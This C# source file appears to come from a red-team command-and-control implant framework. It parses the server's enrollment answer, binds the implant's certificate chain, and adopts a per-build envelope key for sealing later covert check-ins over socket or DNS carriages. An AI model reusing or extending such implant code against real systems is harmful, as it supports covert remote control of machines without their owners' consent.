using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The enroll answer's shared half (extending/implants.md): every frame-
// grammar enrollment carriage -- the socket wire, the DNS grammar -- reads
// the same EnrollResponse body off its wire, and this is the one
// implementation that parses and materializes it. The carriage-specific
// halves (dial, chunking, sealing) stay with each module.

internal static class EnrollFrames
{
    /// <summary>
    /// Parses an assembled EnrollResponse body (the plaintext framed shape)
    /// and materializes the enrollment: status-checked, leaf-bound, chain
    /// carried, and -- when the enrollment bound a build key the dial did
    /// not already carry -- the per-artifact contact key adopted into the
    /// transport profile so later contacts seal under it.
    /// <paramref name="carriage"/> names the module in the adoption log.
    /// </summary>
    public static Task<Enrollment> MaterializeAsync(byte[] answerBody, EnrollDial dial, string carriage)
    {
        var inbound = EnvelopeCodec.Parse(answerBody);
        if (inbound.Count == 0 || inbound[0].Kind != FrameKind.EnrollResponse)
            throw new C2.EnrollRejectedException($"the {carriage} enroll exchange returned no enroll answer");
        Rod.V1.EnrollResponse answer;
        try
        {
            answer = Rod.V1.EnrollResponse.Parser.ParseFrom(inbound[0].Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            throw new C2.EnrollRejectedException($"the {carriage} enroll answer was malformed");
        }
        if (answer.Status != Rod.V1.EnrollStatus.Ok)
            throw new C2.EnrollRejectedException($"enroll rejected: status {answer.Status}");
        if (answer.LeafCertificate.IsEmpty)
            throw new C2.EnrollRejectedException("enroll OK but missing the leaf certificate");

        var enrollment = C2.Materialize(
            answer.ImplantId,
            answer.EngagementId,
            answer.LeafCertificate.ToByteArray(),
            answer.CaChain.Select(chain => chain.ToByteArray()).ToArray(),
            answer.ParentImplantId,
            dial.PrivateKey);

        // The per-artifact contact key the enrollment bound: adopted into
        // the transport profile when the bake carried none, so a walk that
        // later crosses onto another front seals under the key the
        // listener-side binding demands.
        if (!answer.EnvelopeKeyId.IsEmpty
            && !answer.EnvelopeKey.IsEmpty
            && dial.Profile.EnvelopeKey.Length == 0)
        {
            var packed = new byte[answer.EnvelopeKeyId.Length + answer.EnvelopeKey.Length];
            answer.EnvelopeKeyId.CopyTo(packed, 0);
            answer.EnvelopeKey.CopyTo(packed, answer.EnvelopeKeyId.Length);
            dial.Profile.EnvelopeKey = Convert.ToBase64String(packed);
            dial.Log?.WriteLine($"rod-implant: adopted the build's contact key from the {carriage} enroll answer");
        }

        return Task.FromResult(enrollment);
    }
}
